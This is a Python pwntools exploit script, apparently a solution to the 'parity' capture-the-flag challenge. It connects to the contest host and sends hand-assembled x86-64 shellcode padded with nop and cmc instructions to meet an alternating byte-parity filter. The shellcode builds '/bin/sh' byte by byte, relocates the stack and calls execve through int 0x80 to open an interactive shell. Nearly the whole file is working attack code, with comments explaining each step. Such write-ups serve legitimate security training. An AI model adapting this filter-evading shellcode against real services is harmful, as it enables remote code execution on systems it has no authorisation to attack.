
#!/usr/bin/env python3

from pwn import *

HOST = "challs.actf.co"
PORT = 31226

exe = ELF("./parity")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]
io = None


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript="", **kw)
    else:
        return remote(HOST, PORT, **kw)


# Add functions below here, if needed


def main():
    global io
    io = conn(level="debug")
    # good luck pwning :)
    # nop (even) and cmc(odd) are used to pad instructions when the previous ends with the same parity of the first byte of the next one
    io.send(
        asm(
            f"""

            /* as we use int 0x80, we need stack addresses that can be contained in 32 bits. Therefore, we move rsp to bss */
            xor rsp, rsp
            cmc
            add rsp, {exe.bss(0x10401)}
            cmc
            sub rsp, 0x10001
            cmc

            /* zero rdx out. This push might be useless */
            xor rdx, rdx
            cmc

            /* Write /bin/sh into rax by moving a byte at a time, incrementing it if necessary, and shifting it by 8 */
            mov al, 0x67
            inc ax
            cmc
            shl rax, 7
            shl rax, 1
            cmc 
            
            mov al, 0x73
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x2f
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x6d
            inc ax
            cmc
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x69
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x61
            inc ax
            cmc
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x2f
            /* Now rax contains "/bin/sh" */
            
            /* This is not strictly required, but i had the asm wrote to use rdi, so i move rax to rdi */
            push rax
            pop rdi
            nop
            
            /* ebx -> "/bin/sh" */
            push rdi
            push rsp
            pop rbx

            /* ecx -> ["/bin/sh", NULL] */
            push rdx
            cmc
            push rsp
            cmc
            pop rdx
            push rbx
            push rsp
            pop rcx

            /* zero out rsi (env ptr) */
            xor rsi, rsi

            /* as we use int 0x80, even if the program is 64bits, the correct syscall number is 0x0b instead of 0x3b (we use the 32bit ABI basically) */
            xor eax, eax
            cmc
            mov al, 0x0b
            nop
            int 0x80
            """
        )
    )
    io.interactive()


if __name__ == "__main__":
    main()
